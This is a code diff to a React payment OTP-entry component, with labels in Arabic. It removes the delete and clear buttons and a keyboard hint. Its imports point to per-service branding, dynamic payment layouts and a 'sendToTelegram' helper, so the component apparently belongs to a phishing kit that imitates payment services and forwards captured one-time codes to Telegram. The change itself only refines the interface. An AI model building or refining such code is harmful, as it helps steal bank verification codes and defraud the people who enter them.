@@ -4,7 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { Shield, AlertCircle, ArrowLeft, X, Delete } from "lucide-react";
+import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -291,40 +291,6 @@ const PaymentOTPForm = () => {
                 autoComplete="off"
               />
             ))}
-          </div>
-          
-          {/* Action Buttons */}
-          {hasAnyDigit && attempts < 3 && (
-            <div className="flex gap-2 justify-center">
-              <Button
-                type="button"
-                variant="outline"
-                size="sm"
-                onClick={handleDeleteLast}
-                className="flex items-center gap-2"
-              >
-                <Delete className="w-4 h-4" />
-                <span className="text-xs sm:text-sm">حذف آخر رقم</span>
-              </Button>
-              
-              <Button
-                type="button"
-                variant="outline"
-                size="sm"
-                onClick={handleClearAll}
-                className="flex items-center gap-2"
-              >
-                <X className="w-4 h-4" />
-                <span className="text-xs sm:text-sm">مسح الكل</span>
-              </Button>
-            </div>
-          )}
-          
-          {/* Keyboard Instructions */}
-          <div className="text-center mt-4">
-            <p className="text-xs text-muted-foreground">
-              💡 استخدم زر <kbd className="px-2 py-1 text-xs bg-muted rounded mx-1">Backspace</kbd> للحذف
-            </p>
           </div>
         </div>
       
